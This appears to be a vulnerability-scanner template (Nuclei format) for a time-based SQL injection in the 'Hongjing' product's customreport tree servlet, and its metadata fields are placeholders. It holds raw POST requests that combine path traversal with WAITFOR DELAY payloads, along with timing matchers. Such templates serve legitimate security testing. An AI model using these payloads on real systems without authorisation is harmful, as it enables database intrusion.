id: hongjing-tree-sqli
info:
  name: hongjing-tree-sqli
  author: apple
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1'%3bWAITFOR+DELAY+'0%3a0%3a3'--%2b&codeset=UN&priv=1&level=
      - |-
        POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1'%3bWAITFOR+DELAY+'0%3a0%3a6'--%2b&codeset=UN&priv=1&level=
      - |-
        POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1'%3bWAITFOR+DELAY+'0%3a0%3a9'--%2b&codeset=UN&priv=1&level=
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"